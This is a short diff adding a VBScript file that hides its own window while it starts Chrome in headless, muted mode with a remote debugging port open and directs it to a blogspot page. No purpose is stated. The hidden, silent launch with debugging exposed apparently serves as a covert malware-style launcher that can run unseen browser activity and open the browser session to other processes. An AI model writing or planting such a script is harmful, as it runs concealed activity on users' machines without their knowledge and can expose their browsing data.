@@ -1,0 +1,4 @@
+set objSh = CreateObject("WScript.Shell")
+objSh.Run "cmd /k start chrome --headless --mute-audio --remote-debugging-port=9222 https://cachorrodoido2.blogspot.com/", 0
+
+ WScript.Quit()
